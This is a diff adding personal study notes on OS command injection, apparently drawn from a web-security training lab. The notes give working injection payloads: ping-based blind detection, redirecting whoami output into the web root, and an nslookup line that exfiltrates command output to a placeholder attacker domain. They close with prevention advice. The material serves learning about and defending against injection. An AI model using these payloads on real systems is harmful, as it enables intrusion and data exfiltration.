@@ -1,0 +1,109 @@
+OS injection is a way to run commands remotely
+its not always clear where the vulnerability is
+it could be in the url like 
+
+https://insecure-website.com/stockStatus?productID=381&storeID=29
+
+could be changed to have storeID= & echo command &
+
+## Useful Commands ##
+Purpose of command 	Linux 	        Windows
+----------------------+------------+-------------
+Name of current user 	whoami 	        whoami
+Operating system 	uname -a 	ver
+Network configuration 	ifconfig 	ipconfig /all
+Network connections 	netstat -an 	netstat -an
+Running processes 	ps -ef 	        tasklist 
+--------------------------------------------------
+
+sometimes the injection is "blind" it doesnt respond
+to you in a way where you can see if it worked or not
+for blind injection a ping can be used to time the delay
+if there is a delay, then it worked -c 10 makes it 10 seconds
+
+Modify the email parameter, changing it to:
+email=x||ping+-c+10+127.0.0.1||
+
+With redirect:
+
+ You can redirect the output from the injected command into a file within the web root that you can then retrieve using the browser. For example, if the application serves static resources from the filesystem location /var/www/static, then you can submit the following input:
+& whoami > /var/www/static/whoami.txt &
+
+The > character sends the output from the whoami command to the specified file. You can then use the browser to fetch https://vulnerable-website.com/whoami.txt to retrieve the file, and view the output from the injected command. 
+
+
+
+    Use Burp Suite to intercept and modify the request that submits feedback.
+
+    Modify the email parameter, changing it to:
+    email=||whoami>/var/www/images/output.txt||
+    Now use Burp Suite to intercept and modify the request that loads an image of a product.
+
+    Modify the filename parameter, changing the value to the name of the file you specified for the output of the injected command:
+    filename=output.txt
+    Observe that the response contains the output from the injected command.
+
+
+
+With out of band communication:
+
+ You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques. For example:
+& nslookup kgji2ohoyw.web-attacker.com &
+
+This payload uses the nslookup command to cause a DNS lookup for the specified domain. The attacker can monitor for the specified lookup occurring, and thereby detect that the command was successfully injected. 
+
+
+    Use Burp Suite to intercept and modify the request that submits feedback.
+
+    Modify the email parameter, changing it to:
+    email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
+    Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified email parameter.
+
+
+ The out-of-band channel also provides an easy way to exfiltrate the output from injected commands:
+& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
+
+This will cause a DNS lookup to the attacker's domain containing the result of the whoami command:
+wwwuser.kgji2ohoyw.web-attacker.com
+
+Modify the email parameter, changing it to something like the following, but insert your Burp Collaborator subdomain where indicated:
+email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
+
+Ways of injecting OS commands
+
+A variety of shell metacharacters can be used to perform OS command injection attacks.
+
+A number of characters function as command separators, allowing commands to be chained together. The following command separators work on both Windows and Unix-based systems:
+
+    &
+    &&
+    |
+    ||
+
+The following command separators work only on Unix-based systems:
+
+    ;
+    Newline (0x0a or \n)
+
+On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command:
+
+    `
+    injected command `
+    $(
+    injected command )
+
+Note that the different shell metacharacters have subtly different behaviors that might affect whether they work in certain situations, and whether they allow in-band retrieval of command output or are useful only for blind exploitation.
+
+Sometimes, the input that you control appears within quotation marks in the original command. In this situation, you need to terminate the quoted context (using " or ') before using suitable shell metacharacters to inject a new command.
+
+How to prevent OS command injection attacks
+
+By far the most effective way to prevent OS command injection vulnerabilities is to never call out to OS commands from application-layer code. In virtually every case, there are alternate ways of implementing the required functionality using safer platform APIs.
+
+If it is considered unavoidable to call out to OS commands with user-supplied input, then strong input validation must be performed. Some examples of effective validation include:
+
+    Validating against a whitelist of permitted values.
+    Validating that the input is a number.
+    Validating that the input contains only alphanumeric characters, no other syntax or whitespace.
+
+Never attempt to sanitize input by escaping shell metacharacters. In practice, this is just too error-prone and vulnerable to being bypassed by a skilled attacker. 
